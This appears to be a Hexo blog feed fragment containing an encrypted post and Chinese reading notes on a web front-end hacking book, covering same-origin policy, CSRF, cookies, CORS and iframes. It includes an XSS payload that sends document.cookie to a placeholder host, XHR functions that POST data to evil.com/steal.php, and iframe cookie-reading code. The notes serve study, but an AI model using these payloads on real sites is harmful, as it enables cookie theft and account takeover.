    <url>/2020/01/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="045861753558aaf718b6a57c5582fffcdf9d2338faf2caa0d1fc3894286ef655">fa8d8e1d6b182b6f3b4eb47ba2dc6db00d194214d0f313225052b65a42d6f917059fc957bc2ee3f05f1f3dc4e6f81cf7652735824bae0d345f11a86d4d9caa50f60b4706e99cba103f8204921aac380d0dd3357dbb87b5c5b85be20bbf6de49a5c626afbb2632bf971ad00d48fc9aaadc3786417805a90df324cfd237fbf3c9e71218ebb435fc2a81be57221ea97ff6678f93b3d73366b0a7c90833328cc481498ad24288690b91611c4b6e779219e4b1ca15c4691159c04e9b8aea46914952a0216774bbd4cab4314fb1ffdb7470e912ded4e703f7ef622253752d6cb1d51f658675ce0fafecaa22109f07670d69790f337c634534bbf8d5a8966ff1548b77a5c4c08bb44f1a2844336b6538548474bc83c216b3485bad84b4bb9463b599d64d13d6f32e6eec500a02a638d77e47296ade1bd285f97c830d6ecf5678b1a1fe5b2f1729eade9163aaa3c1d60162255852f6a406417e086b6c76b33b068ce3bf0b92edc5407cb0e6da0775f13f594391872a06c1d73afa482425a26713609151598c14f29feefb2c0315e19eeea17dc213c71eace3ba0e29f33924b5c8b47346a1e6d8fc499a837191ec72e9d37b96d2d8b5e2feb3f10df5cb646ae7cd2fcc608c122aff634b45f4780f172b4b29077f0a6cf7659789b8177ef222021c4c7c9a7a8fb8562125345c87b7002b85538c56a2ef3facddbfbd09a1b3a6055aca24c80d80b04697cb81fce496f69b43dabc10d3f43a60efd5c8f4943882a8b1e4b5eb4c2238222ed8b2a6d7b2d007bbb271d166a95ddf4bb4ddca310eea66a72b4c76977f91b9a37c7b28039ced2f8f91717b51b9a1db33befa8b47f10eddabc138198579ea2863a54dd8cd26ba5218b69e4853713fadd77b39851b765afc2d61fffb7f13895a6e4afae56deafa698895ade4a02b5a6accd5d6602ed90f7099fc6aa46c23a424458ed88048b971bab8d81c93490d2d97f6285eb849a6b97e94eb43841537ea43af238a9c86bc27de66b71128f196c652481845d7cd6ebb9c7dca4081885a081571d1fdd4a5d59fe7c150ff76d7cf08f9fd863cc045bf0b1341ab760a501969594c8d39069e4ec3d72cfefa7463004dad387c53edc54a3fa781bac5fcc8762b29334ea5726f01c6c6d170eeff9b04ab4ed01263952d99a76069f3f3a4e6820f36cb973fffcf68723be84d7adfa2ceec10bfc4915d0e977768c63e2ef29f2afae08beaed9618554e05d013eef9d3922ae11818d41b2a4d750c10a45e5a998be230a40e22f326b92613703c2827c9523c4a1916cb2aeaec406adde05b369e3f895e94733b2ab87932903ad1992c931de32a83885ca9e4049525f83ac9df365b0bc206452a231cc03fdeffb3dd7ac536b5e437c4761a840c71585375d8bc24b7774814a00223f5689126eaf97b965477b1ef4f36eaab7e6db757e6bbfcbf965a1ab8e2c5d8c894dae69e370acfb5a5bdc4aa2c33d94ea98d24498953da60c07cf4a061a99898ae79675ee2d004a098df545a4898b5b6f8ea8a803dd3cd2e4109c16283d5345cfe4b15471c621a3027564e02da3dadd15c17fad6ec2de1c147881497a0f50ad0aac7e3702a52b3063597db5f3870bcb1d5e489ac17a8cdeffc9f9df05406fa314fac594f9d45b205459d86e1081303f9744d662c11c855a6b15d0e38c0d600f727849c6b9c1825ab9895cac8f426cacf5018ce2f9100f1ed559433e3e10e75be3b077f1719d9bb289e83bfbe8ab1f862de3cad60b029dd469b705523dda3b0046b269c866edaae19258e1d4dfdcc650f3d86f3a4df0dbf129a632caa21baca54310fab8500f5ac0e390f658c09aa4e0f57e52ca877ed81828f177d16c892851978971804f67c1da8db7c640194151602d2fdb69e81e6e645831e654f0b75474e63814281b933741663bb421a3ff7faea453943f98480fd7643493fd4ba460d3d542b47eeef4aa33ed8ab7708572799fc0112b5d995e0455b86238dc73d9b676ecb6b3122618589533faf4efc6844497293410dfd5e76c81974d4bf050c9b81a5a312d6d0db62d498d04d05216decd7720e182ee497be4a4657edcf8bbda6970c388ca31204e18aec192a72c90889d8796d6a4df31761e1ca291eb8037361df07295ba688fc0720a31cbb22e370cff391e8599cae26f40c7264a2cdba848a992fa46cf8788335af90e120b64ef97762d6e724c7d831e1ae63920bac6facc8ef2b378f14ea18e947e2a55723b08511a35f66438e53ab4abb598d54cec0c6941d7750a49d57ff2398296db4ce821ed549bf2267f067969b51c0f6fe41b4e365ce47804a15254cbb5f34b7334c1ef772278d13627aea3c042d2155269dad33f2e7469d9e79b8b3c25f22b781dd5c41ba7d42556cce68891c31436f97fa84a1e48e91e412112cbe813e6d3dfeff942b68ae3ef2bb5b8c72bfe077ef3d76bb2489907fe7a13fc71d89fe61d302d11125d8825e016d10e8a9e0daf0c92d7ade216b60b7842f2d10e0c0862df20a36825228205ef27fae7043be32ae210db11b7f544e4e1607788f082c45b0d52266d17b96aa8642ac4cffb63ba4faec1994f6d7078624867b4e0f91b7777f3c3aa26c074feb2565017dbad03c7caa88ab0926cafd4ea66bad8c1a865f2b17aa72b67825febd6814fde75aa323bcf03b36479f570407c30e120f35644a520d8d156fe847211e3dc10aeed2746965c6780b86036134728cd165f4e667fa968222c8d3d0c248b376fa8310ace54f09f4ca4f3302f4761350e4a59636ff8df18c5c4208843ae5b7255e4e14f9ddac0e4c0d477b4303c03f0685d4f04b54e47c097c77a526615e5f2b6a84516afaf55622552655fb2e3696b435ca2d41e977374863c5b9158a05b4f7c4ed95200304ac2276c2081f805f6ab15d24327064fb31510ddaf966a541b23b82ee4b3c4b763086d1e7da1c6d9346390d0b038484a1e15312ef56818a146f46c54e4e2673948218e437af4ce37867d6898f6c3446f196aa269f86b289d7a767eb7b4fcae3d152fa69f0cb7da0acc6299c42a82fb781738f8ddfcbd6b59d65bf8a0c78cdd7f1f7e8113b95b0e147715e2878ac289af76346adc473e9e69d5d8d50253986fa33e9848dfc706191d8eda7604bf308b53184fae526e7b45a4fb6ce6de0afaa958bec4a01384bb177231424f4079985e2addb233cb23205f82844594b7454353baa1e24f2d12b86a11ab82ebc9496d3707eb877305508c3b9c7ae7d06b518ae2c3a860a0f7c46f1b5fcf1c6d6c4ca491d98f1cc3de57242365a3d5b64c877c7b6f05d54f7955150de380d6cd8795a2ca79c42e5de3b3a3ce78ef8abb4529012c3a3bff99001681553b3e2c608bd9a34aa8604cee881e0d44eab620df7596ad0c451557ccad86491ddb8ab9c82492248aefa2e4aa63160bb68041779a06fb05515e13cb77f1636cd6bc2c5e9583d6cca6fe178890ffc9f000c8b3fd871c3d774f40d0639180ad63f357cb541f748eca7f15f62867bdb34b0d7e8ca5a93a5448ef760bfe5c99831b52825f0af2b4be5b5335959f256873537d56b2317033c2bd5293033d7e6dd027cd6b64d7ab76148e47f79ec75321f51f3f1969aba770dd29169dcefbaea40daa73fc17d9c21c7b396fba0ff6067a25e989863cd3ea07c96a92152b5ec689bb589e56d348a2185accd7ee8f6a5fff91aacc3846a2eb139fa0e656a222985503e6233a350f0ba10772977ecda422cf895dfb4270b5c72a11b6fc24f4c3192f86cdb2ef4a46b9b5e97c85efdff6be13a9e281eb11f258e3ca1b57e541f94a6cfdcfbe9485420940a0d6b494902e3ddf51afb783f499e2f9be25afcb7279f9117ae01309135db01ce9b973e00315afb63690baca0a205625dfcb6f0bf3bde37ac46f5606dc71a84b66a959c096d3a28be3e448e6d12a128c76812d2b1cba7a4ba1ef3e499fc9bcbd74fbf765d32afa4e3bd1b38fe336e7e00f85d8bccd164457cc20a1c803f8a7559ea184fbcb3e2cd5bd1a38c54c432160e947bdbbd00849db13861f4c801c898928f422934332381458186f01c89c947a27ef0d70195d06391fe1ac66af915cfc9b38cd243979a93aaa3129c5da2fa695b2b58092f4dc06867974afa72fc5cf2da8aec6f3cad476fba344371557bdb5d76cfb1e85cf8346dedf7aff6631baecf038c3bd2db816e2141d89681c7b9d4f403c54915c2ddc2ec07c2216868b73c009321ca9e2c6b8ff0ce595faa45049844a055a0169b979605bae0203c36137fcee60fba6d7e5ed0c88f6fdd11038d8fa2753fb193c1b947b589aa092ca9714b55a0c150072124671d8221467d18dea7664c07b8c058e1c376fc87b849d69ccf0aaa824275c4050c6a19d252430078529a5ae450ee27ace615914cded02ecf009f5b9cb962db1dd846aef3e0234d75f8e59b24e5cbae5d69522f3ce53737cec5bbd48b1082fe876e4f6ebed1442710dfac7af1bcca87e2fec15b6f745602f4d25c75b98c802db98edbadfb6827dfc6dc17a7ebb149466073d3f2a03286cb23bf6685c7c3a63bc931f216318bc01aa12b476eb9defed0f35404274662a1dbf70f04f486a14bd74de1b7967af65d26183a4735a0110cce0974df41279ce226be9c9a08c2a5ef026127d147877eac941ffb9dddd479adc5745aac709a47d9a4b0fdb4a148db0ca687ee59f1487847be8b9aa3deba2ef2c3c1b157246ae8c6966a3068d8211d94283a3381740188e754730adf55ee58914416a7f346ac318380d6254deb427877c370cdbb75bc5e3ccff3293f008e317ebc8f2b056c593dd4c58b9321a4b4702757946d20d68ff793e351d1062bb1802f36340b13ee44a978658db2152efba4cbd18decc9630a481a2d0ceef1088cc2cda6dda88c2f344316b272bb07bbc1382b7ab3edd2a0c132cc145a6684ba8b38a0c8d655355e52a2f3d57f70bd076c11d46c992d8ec69e385cb20736d00d433918e7c929decb32ef6f7bd7a06a9ebd3a9fd660d8c86ded630d58ba975a280215b994f53d3b16be1c8e9ac780544120635e90e2c22d2efb3b463789cc96bdd53d02e762785456ba33f6691a9e0f3fa65f56b40782f2236a6bf0169b4d0eb77268a5361011ca83603dd347cb6e238a6d3a7cfae048db2efc62a7b4e1f204d1acdd9aee24b077cd6a68e1dd48f3e900ed31f51a1ef1dc7e2d27a157e9309375506ea5f4c0fcd07df884e8cd49e18041b6befc07db5de69b2e9c674a6301ba90df7ad18b5f68656f824f1dbeea16ba0e62cd510ff0c9a5e09571749e3f2137c1ad5de743b0082c9f3a1a73574fe2b8107ba35e42c373a3e1f063d60759051f038c4f3a57a52bc80182d00d9fcc6bf9ed6835beeb5eb71f2edc99ea3caad548d9477203ff1d1c93b4954d8c5f519a778908c9ba9bc59477d2a4c64ac6bdf78a68a7b8c509d8812182dfa9536e7f4d0b1dad9251d40d3749aaaf013c11e83e097d917f677d0f7597be71b3ac367c2e2e97434d3dae6ef11e024e277f30359a7c0c71c4426b5981693c1ebd1eabb7fdb8dac3aee6d4fc043ed905b29510233a5ef0ee40f32f73374451a307f887601d6f819f728b242a53b5ceef5a840b02736cc24b6e7ff7cc9f1ee900add8e840dffd7ec2dbe3531e702f98bb82f9faa1a8c2903c21f982d2584461de83e3ed7811938bb8571a33a78a69b4d872b6915cacb07217b980d28cca5c1389b34e3fb95e81077646604f477dbdb0c50ec5d5c247dc205bc0e97f6a70704b5d7c65ba80506cdb369e9e052bcc6fa0cccc36eb98d4265407ade8c637b04afb06c29ffeb5fa13ca695f81f9bc6fd6d78b1289030c67af9294e9083de561a731409bf104e2a6312732fd8cece9f7264e918e647763739420bf5aed2907533f06fda944d6bca868218705a5b2c6f4151c5081f2b04f3b6897f39c0cd047c1e4e640f33d23340c0600c3536e029e0b1dcfd4891eb764ecd260c2c56caa2f8ab98f83fe90fa015136782b0cf68f692a274f586419c44867f909f3a9a99fe4b1d2b5f29d1eb0cdf2ce5c308d61600453a67ea1ecb0a53daeeec702d65b4e83a80ec459f441837494e939d301c6c8acf6a0d2918295000f5d166b5493e985be14afc56192ff88a028a194bb643aa3ed84df859e206f0672e3467cd5a2ea5f55ae44f58e2f208d150cecbc59552165fbc43ada413e01a79a83946c7b0a4102965cf65235e81027b50524b185f3c3c60b2f04f257220a935c1bf97fd64dc75294deb3c9e2bbe2e002c56c77ac7db61621ed27b8343a4ac6990851daf58341abb9649c4e7f1456fd5f47326f1159dfc1cd0bf2462606b1f16c4c235f1af5e95cf63f1e9f5d1ec5a0ee1084769c162516fc799e2aad14337be4f71969f21c9b05bbb6b5245b41a66f293534f00f0a8899de5e99f24f7c221e4fd1b3d4bb62f356b627a77fbae71c6752e97e45dacae66a9f69d000727fcb38929f8b4f920c56335e2c2b41031b42c531ce5de721d4c1cae3b71837fef3c81c0886d82af05f690a231416e4c4515c58b4c398480f40d76b800253774aa8dd96e2c1e6da940a3cdbfa928a010b83da408ecd5109ce1375e91661c38813b0a23dd1ef61bb581d8dcffb280a1ee042202f38a0939d7df62190efc0542454a3de0a67aafcbcf53cae196449451f33a068da515e579ab25319c99a1427ffe7004327d84bc886e83ebd21580b288c0193937ab1a41ff48f31f2cdcd72584579271fa6b38bed4cfb97c5882a78df6f57085d0db5590351911fdbdf4e5c6290932e3803c27a6a14234a68b92f313050c0e905c2a27b46733f2a2b88c4ffd18a643473782b4c7dd1133d3c1ce2ac316a18766f26ae18852d42671fca7f76e841203b4f9dd2af0dff1058182ac59817f27cabd7b255177867f0347ef649fef9e740649881a89ea2e6880d60343ebd0577e62f4b5313fb135178df3917ccd4488135ab45d2f74719bc3c663770084fbad4ff572f793ad196730c46305f34e0ae0327a7dd1b87b17da13f3c1d9171ec53aa218a7fe31cead897f37b204e2d20b67e223a0ec47548d1d288142abfcff49c3bb58e8b9866ad853ac7b290aeb98be752f05513b47f50ff0d68d5c9ce79ea0973c13792e462a2e145683cbc7bf327fb71ed1c75397a0efd6bc62834a673b5ee4f5df11cd6f916da6b615177f09950aed78dba8da428b6188894e78cddd8be769b8bec682d6a9d350e9327c1b225350675e4d96aa23c8391461b0620c4da4d5d98e4a30341c6b36cd5fead5995db7770cd5e34553ede0204621553e4e2c60f505fd0aa88b3c2eb62a6bcdde5aceda97c055baf44655379c43e29d9da5445e5ebeb42b70f933929503d908db87cbd4dd85cb897e8fd4cccd1c62c75b47b47e4e1ca270e1c4e731973231b75999edd480654581d06ca1b8be898e14c40dc77742f50b2dfc966bfa1b3c87d629f1ccf228111cd6de69fed5e230ff8f9e579fa7ba69fc966d756c8175f552a6fe8d5278dcebf4fa94a4f4751c2ce1c4aef26d2930732e7f061f4653964a61e525011ec6bf19155fbdeafb7b5a43a4361240938f277bc961293a4e5926848513b47fd4564251b2ec55392661ffbf12871cb6b6272cabcdb49fd0028149aa3c5401e144599058fb999f504dde4d75dd5cc5ee43d19748533b7ef28c2e9eef92179e01b31d44da44214f2b60d83e919525e5ba2bcb40167bfef26f180667684efcc323ba6e122273dc315aa736248836523e1367dfb515533de12d87ab6f759f553ec136ebd14d3ef8d553966afdc7d6f062408ac73cdc9485e5fe4bbb497ad18a64a52589e28385d4edc14227528b2841943db6f2db1cb8e7869f528965d126d69551b81549e514083beb8a07e163a46e36d0ee2291076879fbc3704d5d63c887a5334c0a25d9ae8c073fe352b540109e18e4db8fe6d4497d6a4a6ad17d9ce8b5b0e96a038bbc511bd325524366e85ccd43a8320a6e667bc729aa0b1340446029d627aa6bd5f82777756f8d633a56ec98e6a7c5f76bb1639e81790ec7cdff69c9f8c3692a93bc69228cf0c53c48c876056042f7f347f54caaf7209ff4b858460452ee2e95cb326e6fc3fe8a7daa645f473cda3d13d4283ed89148e79f8b05b37b6cff45017c94d86f82d7e48f24e7f0ecb7f5701bf21cca2df4587de9b431b8d7eb0bbf3ed1c2198d889be13371ec8e9def59c085c1ec950815c07b07e8adb2cd65573dee3b37490328f41fb7cb359757feb2873c6e7746658295c1fd81d493008a588a2492690f1e38d74799b469efb3efb932cc211eadde6b9c8874a00cf81192497cc2b837bcb0dfd7bc49052a6a958efc2d2c780617565bcf22ee61a7a62b22568e48892dd0f6f3b74092b6efab18f766977a253b9305f96c6c188544c87c1ce9c3bceda208aaa923b8d67947127cee62dfeb957dbb92ff50768908b9bce858564d6aa3efca6f814a929835fd54fb0bb312d73533d8e804c666fa2a497df7defa8d87c23b8b6a44d32a4fa840ef1a47a0e2b07bcfd81111df3fe9d30aa45dc1e3c487efd26d31900e8f9577ae64af815a89c97d47e98e0b29250a9fd1dd319eeac39845d969e14ca885ac0a252bf414f090eb2d2187eff9dca7a533a88d019d7e921de8669e2ae712b59ba73d208466df11d35c0dfe8868e1ef52de25b3b7f155d9c4e1aca7035540aceb3a066bed7064f811a0102ba0a33185c25e2a2fa73b29d07b1150f891797f5648978243ccf975f0468b88a8b5d918177a7365fd47e5e2fb672a7add120e6756596ae64a38a49dbb7f2648baf05db48a5bdefd0c974e6a7839dd9b20d27bba7260d19b27bdf22bfb54573afbcbf6937e542414b481d3ea8c4abca7cfb469cb23bbbee52ff99c73e1c5e27e12ce185e8cb54b3c114943119b1994f75a60b3a3af009ac818f572e15ac924ce377c5ef876c6c3d4a155b7183ba6cbeb6abc0172c5bb483475f151a98fffdb0deb0c28daade6ae3986c30df8f59dc64dd8d8ee253ec2523702bd1d72f21974a499ddd16f6af8fbd1ed02503cc8a3dd337a29733bf0be9a03735bf98a9f38fc48a455ecc2e83d825a2820654d459f683c219905147a49e90682df331746daaf5e79c7ee69565e5e329d3d8e2db3fe48b38e43892be64f112b25b97da35e7a419e2c770d09f318189eabb73145ced23a9ffd40923fb78c85a813577efc5cbda545697c67f524b7ec3a8dcc6ca3913861d61eb1f599d193b252c132c2536ad791865472abab9f05a2ae944b7d335e92481c25e3b3139bba50830c3851995f3d940570cff1e807b01852ef598dbdaf4c6f0d1738d58eac285971feb1e4ca95350a974db8d9419b1da6a91d1a1fbee0309e5d556c036bad16914f691535e34ee9a026e04868b3e4ff6f555039cd992c6776dc51ff0da7248313caca6de7b195b8cc2f483299556c9bace9cba15d62540bb36e18653510bba9b65df975a05919fb805e6cab0485ef128c7d743296c1b286a11a9c17652c226fe24a099e825ebcde4ccb0ec2a03053e7b082ffd10dce857b6bf80a1eb88020e8de04c43e254230e9d37dd724ffb42dd7b818c51dd7f8d5a55ea94f92205b59d634f2234fb7ddf87e568759dca78d73e7da86b1e97c4e9d8643e11fbd0109526cab44201ffb61820d2e6c8c225cbec6a1922415922b8c26e4a6c278d3984b55209974dc59645e9ee1584f37098cf9069ad799f5ff7aedbb80371305a720e03df20619f9631883b829e5ca8d0b4fd1c0d84945317e311c725b4d376c77ec4f88d3fab88076e537f8d3e17c5357b576c11622694843e066d68e81e57fc708a8a00fccd114245ca4501aac9cc93fa17ed5ff52e88bdd97ed88259ccf74851152885126c82fed10bd923c68e5a1ab900380f834e01210a6c503c7c6a8edb83f6e9f29a57aaef6baf118c92b56dd57b61f089a3e15c4486b3f5898c607576a45c227ccf2945753a713321c36a35e48e8b928a83466de527e738a78e73a2df53da285c6c01fb1b0b623f3011227e70ce584abe3f35677efd2b2be7cbd6fc49c2bcb63531b5abfae776291fb1210abc89be2cea4b40486d2b7c9e3b4c6b11dd368800e4ab33f2c8fe30a72f620</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>web前端黑客技术揭秘-读书笔记[working]</title>
    <url>/2019/09/07/web%E5%89%8D%E7%AB%AF%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="第二章-前端基础">第二章 前端基础</h2>
<h3 id="同域的概念">同域的概念</h3>
<ul>
<li>同协议(http https)</li>
<li>同域名</li>
<li>同端口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt; eval(location.hash.substr(1));&lt;/script&gt; 获取锚点后面的东西并执行</span><br><span class="line">http://xxx/xxx#new%20Image.src=&quot;http://xxxxx/com?c=&quot;+escape(document.cookie)</span><br></pre></td></tr></table></figure>
<h3 id="CSRF">CSRF</h3>
<blockquote>
<p>CSRF会借用目标用户的权限做一些借刀杀人的事情(注意是借用而不是盗用, 不是要拿到权限), 盗取通常是xss干的事情, 借用是csrf, 例子有p4ctf 的 web50</p>
</blockquote>
<h3 id="HTTP">HTTP</h3>
<p>1.1 1.0 0.9</p>
<ul>
<li>HttpOnly: (默认无, 如果有的话表明cookie仅仅存在于http层面不能被客户端脚本读取)</li>
<li>Secure: (默认无, 有则表明cookie仅仅通过https来传输)</li>
</ul>
<h3 id="iframe">iframe</h3>
<p>很多网站会通过iframe来引入第三方内容比如广告,第三方web游戏和应用.</p>
<p>约定网页是父页而iframe中的是子页. 如果父页和子页同源,那么可以通过contentWindow来操作彼此的DOM树, 否则同源策略会禁止双方对彼此的资源读写. 但是<code>子页还是可以对父页的location值进行写操作,这样可以让父页重定向到其他网页比如广告页面中</code> 但是对location是没有读权限的, 因为有些隐私信息会存在父页的url中, 这样做可以避免隐私泄露.</p>
<h3 id="获取特定标签对象">获取特定标签对象</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&apos;private_msg&apos;).innerHTML;</span><br><span class="line">document.getElementsByTagName(&apos;div&apos;)[2].innerHTML;</span><br></pre></td></tr></table></figure>
<h3 id="请求头响应头和javascript">请求头响应头和javascript</h3>
<p>不是任何请求头都可以通过javascript来设置.可以通过<code>getResponseHeader</code>和<code>getAllResponseHeaders</code>来读取, 但是同时, 不是所有响应头都是可以被客户端脚本读取的, 其中就有设置了HttpOnly的Set-Cookie/Set-Cookie2, 这是严禁客户端脚本读取的.</p>
<h3 id="HttpOnly-Cookie-读取">HttpOnly Cookie 读取</h3>
<p>在apache的历史版本里面,http请求长度超过LimitRequestFieldSize长度的时候, 服务器返回400错误并在返回消息中将出错的请求头内容输出, 其中就包括了httponly cookie</p>
<h3 id="Ajax">Ajax</h3>
<p>Ajax是严格遵循同源策略的, 既不能从另一个域读取数据也不能向他发送数据. 但是有一种场合除外, <a href="http://www.foo.com" target="_blank" rel="noopener">www.foo.com</a> <a href="http://xn--www-633e.evil.com" target="_blank" rel="noopener">向www.evil.com</a> 发送数据的时候带上请求头Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a> . 同时目标域来判断这个域名是否在白名单中,如果是就返回响应头Access-Control-Allow-Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a> 表示同意跨域. 如果值是通配符*, 表示任何域都可以发送数据过来.</p>
<p>如果不返回响应头, 浏览器就会报权限错误.然而, 实际上数据已经被目标域给接受了.但是这样的跨域无法带上会话信息, 除非设置xhr的withCreadentials属性为true.目标域:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: http://foo.com&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Credentials: true&quot;); // 如果为true那么上面的值不能为通配符* ,这是浏览器为了安全进行的考虑</span><br></pre></td></tr></table></figure>
<h3 id="post">post</h3>
<p>一般的content-type为application/x-www-form-urlencoded, 如果是上传文件就一般为 multipart/form-data</p>
<p>一般post</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> request = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)&#123;</span><br><span class="line">        request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.ActiveXObject)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            request - <span class="keyword">new</span> <span class="built_in">window</span>.ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> request;</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line">request = <span class="function"><span class="keyword">function</span>(<span class="params">method, src, argv, content_type</span>)</span>&#123;</span><br><span class="line">    xhr.open(method, src, <span class="literal">false</span>); <span class="comment">// 同步方式, false为同步, true就是异步就是ajax</span></span><br><span class="line">    <span class="keyword">if</span>(method==<span class="string">"POST"</span>)xhr.setRequestHeader(<span class="string">'Content-Type'</span>,content-type); <span class="comment">// 设置类型, 普通表单还是文件</span></span><br><span class="line">    xhr.send(argv);</span><br><span class="line">    <span class="keyword">return</span> xhr.responseText;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">attack_a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src = <span class="string">"http://www.evil.com/steal.php"</span>;</span><br><span class="line">    <span class="keyword">var</span> argv_0 = <span class="string">"&amp;name=value1&amp;name2=value2"</span>;</span><br><span class="line">    request(<span class="string">"POST"</span>, src, argv_0, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attack_b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src = <span class="string">"http://www.evil.com/steal.php"</span>;</span><br><span class="line">    <span class="keyword">var</span> name1 = <span class="string">"value1"</span>;</span><br><span class="line">    <span class="keyword">var</span> name2 = <span class="string">"value2"</span>;</span><br><span class="line">    <span class="keyword">var</span> argv_0 = <span class="string">"\r\n"</span>;</span><br><span class="line">    argv_0 += <span class="string">"------------aabbaabb\r\nContent-Disposition: form-data; name=\"name1\"\r\n\r\n"</span>;</span><br><span class="line">    argv_0 += (name1 + <span class="string">"\r\n"</span>);</span><br><span class="line">    argv_0 += <span class="string">"------------aabbaabb\r\nContent-Disposition: form-data; name=\"name2\"\r\n\r\n"</span>;</span><br><span class="line">    argv_0 += (name2 + <span class="string">"\r\n"</span>);</span><br><span class="line">    argv_0 += <span class="string">"------------aabbaabb--\r\n"</span>;</span><br><span class="line">    request(<span class="string">"POST"</span>, src, argv_0, <span class="string">"multipart/form-data;boundary=------------aabbaabb"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attack_a();</span><br><span class="line">attack_b();</span><br></pre></td></tr></table></figure>
<p>或者form表单自提交也可以模拟(常用于csrf中)</p>
<h3 id="子域策略cookie">子域策略cookie</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie=&quot;test=1;domain=foo.com&quot;</span><br><span class="line">foo.com成为了父级域名, 这样多个子域名之间可以共享cookie</span><br></pre></td></tr></table></figure>
<h3 id="路径策略cookie">路径策略cookie</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># /evil/ 路径想读取 /admin/ 路径下的cookie的话, 可以通过跨域iframe来实现</span><br><span class="line">xc = <span class="function"><span class="keyword">function</span>(<span class="params">src</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    o.src = src;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(o);</span><br><span class="line">    o.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        d = o.contentDocument || o.contentWindow.document;</span><br><span class="line">        alert(d.cookie);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;(<span class="string">'http://a.foo.com/admin/index.php'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="http-only-cookie-泄露的情况">http-only cookie 泄露的情况</h3>
<ul>
<li>phpinfo 调试信息</li>
<li>Django 调试信息</li>
<li>Apache 2.2 400 错误暴露</li>
</ul>
<h3 id="localStorage-cookie">localStorage cookie</h3>
<blockquote>
<p>cookie大体上分sessionStorage (存储在内存中) 和localStorage(存储在本地文件系统中)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localStorage.setItem(&quot;a&quot;, &quot;xxxxxxxxxxxxxxx&quot;);</span><br><span class="line">localStorage.getItem(&quot;a&quot;);</span><br><span class="line">localStorage.removeItem(&quot;a&quot;);</span><br></pre></td></tr></table></figure>
<p>在数据时效性上, localStorage不像sessionStorage 可以设置数据存活的时间, 所以只要用户不去主动删除, localStorage的内容将永远存在.</p>
<p>localStorage 存储对XSS没有任何防御机制, 一旦出现XSS漏洞, 那么存储在localStorage的数据就极易获取.</p>
<h3 id="利用E4X来混淆javascript代码">利用E4X来混淆javascript代码</h3>
<p>E4X技术是javascript和actionscript的一种标准, 当前只有firefox支持, 这种技术是<strong>将XML作为javascript的对象</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    foo = <span class="xml"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="tag">&lt;<span class="name">id</span> <span class="attr">name</span>=<span class="string">"thx"</span>&gt;</span>x<span class="tag">&lt;/<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span>; <span class="comment">// 没有引号包围的!</span></span></span><br><span class="line">    alert(foo.id);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将javascript代码放入xml数据中 比如x=&lt;&gt;alert(‘htllo’)&lt;/&gt;, 但是这样子不能自执行, 需要eval(x).要达到自我执行, 就这样写x=&lt;&gt;{alert(‘hello’)}&lt;/&gt;, 表示里面是要执行的脚本.</p>
<h3 id="javascript-函数劫持">javascript 函数劫持</h3>
<p>只要在这个函数使用前再次声明一下就好了</p>
